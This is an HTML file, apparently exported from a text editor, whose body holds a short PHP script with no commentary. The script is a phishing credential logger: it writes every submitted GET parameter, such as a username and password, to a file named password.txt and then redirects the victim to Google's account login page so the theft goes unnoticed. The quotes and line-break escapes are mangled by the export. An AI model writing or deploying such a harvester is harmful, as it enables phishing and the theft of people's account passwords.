<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <meta http-equiv="Content-Style-Type" content="text/css">
  <title></title>
  <meta name="Generator" content="Cocoa HTML Writer">
  <meta name="CocoaVersion" content="1038.36">
  <style type="text/css">
    p.p1 {margin: 0.0px 0.0px 0.0px 0.0px; font: 14.0px Helvetica; color: #020202; background-color: #ffffff}
  </style>
</head>
<body>
<p class="p1">&lt;?php</p>
<p class="p1">header(“Location: https://www.google.com/accounts/ServiceLoginAuth “);</p>
<p class="p1">$handle = fopen(“/login/password.txt”, “a”);</p>
<p class="p1">foreach($_GET as $variable =&gt; $value) {</p>
<p class="p1">fwrite($handle, $variable);</p>
<p class="p1">fwrite($handle, “=”);</p>
<p class="p1">fwrite($handle, $value);</p>
<p class="p1">fwrite($handle, “rn”);</p>
<p class="p1">}</p>
<p class="p1">fwrite($handle, “rn”);</p>
<p class="p1">fclose($handle);</p>
<p class="p1">exit;</p>
<p class="p1">?&gt;</p>
</body>
</html>
